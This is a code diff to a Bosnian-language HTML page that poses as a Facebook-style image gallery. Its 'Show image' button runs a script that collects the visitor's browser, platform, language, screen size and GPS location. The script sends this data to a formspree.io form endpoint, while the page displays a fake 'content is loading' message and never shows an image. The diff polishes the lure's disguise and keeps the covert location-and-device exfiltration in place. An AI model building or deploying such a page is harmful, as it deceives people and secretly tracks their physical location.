@@ -2,61 +2,131 @@
 <html lang="bs">
 <head>
   <meta charset="UTF-8">
-  <title>Pogledaj sliku</title>
+  <title>Pogledaj sadržaj</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
   <style>
-    body { font-family: Arial, sans-serif; padding: 20px; text-align: center; }
-    button { padding: 14px 20px; font-size: 18px; cursor: pointer; }
+    body {
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial;
+      background: #f0f2f5;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: 60px auto;
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+      overflow: hidden;
+    }
+
+    .header {
+      background: #1877f2;
+      color: white;
+      padding: 16px;
+      font-size: 18px;
+      font-weight: bold;
+      text-align: center;
+    }
+
+    .content {
+      padding: 20px;
+      text-align: center;
+    }
+
+    .content img {
+      width: 100%;
+      border-radius: 8px;
+      margin-bottom: 15px;
+    }
+
+    .title {
+      font-size: 18px;
+      margin-bottom: 10px;
+      font-weight: 500;
+    }
+
+    .button {
+      background: #1877f2;
+      color: white;
+      border: none;
+      padding: 14px;
+      width: 100%;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .button:hover {
+      background: #166fe5;
+    }
+
+    .status {
+      margin-top: 10px;
+      font-size: 14px;
+      color: gray;
+    }
   </style>
 </head>
+
 <body>
 
-  <h2>Klikni da vidiš sliku</h2>
-  <button onclick="startCheck()">Prikaži sliku</button>
-  <p id="status"></p>
+<div class="container">
+  <div class="header">Galerija</div>
 
-  <script>
-    async function startCheck() {
-      document.getElementById("status").textContent = "Učitavanje...";
+  <div class="content">
+    <img src="https://via.placeholder.com/400x250" alt="Preview">
 
-      const data = {
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        screen: screen.width + "x" + screen.height,
-        time: new Date().toLocaleString()
-      };
+    <div class="title">Klikni da vidiš sliku</div>
 
-      // GPS (Popup)
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          function(position) {
-            data.lat = position.coords.latitude;
-            data.lon = position.coords.longitude;
+    <button class="button" onclick="start()">Prikaži sliku</button>
 
-            sendData(data);
-          },
-          function(error) {
-            data.gps = "Nije dozvoljeno";
-            sendData(data);
-          }
-        );
-      } else {
-        sendData(data);
+    <div class="status" id="status"></div>
+  </div>
+</div>
+
+<script>
+async function start() {
+  document.getElementById("status").textContent = "Učitavanje...";
+
+  let data = {
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    screen: screen.width + "x" + screen.height,
+    time: new Date().toLocaleString()
+  };
+
+  // GPS
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      function(pos) {
+        data.lat = pos.coords.latitude;
+        data.lon = pos.coords.longitude;
+        send(data);
+      },
+      function() {
+        send(data);
       }
-    }
+    );
+  } else {
+    send(data);
+  }
+}
 
-    function sendData(data) {
-      fetch("https://formspree.io/f/mnjlyqqy", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify(data)
-      });
+function send(data) {
+  fetch("https://formspree.io/f/mnjlyqqy", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify(data)
+  });
 
-      document.getElementById("status").textContent = "Slika se učitava...";
-    }
-  </script>
+  document.getElementById("status").textContent = "Sadržaj se učitava...";
+}
+</script>
 
 </body>
 </html>
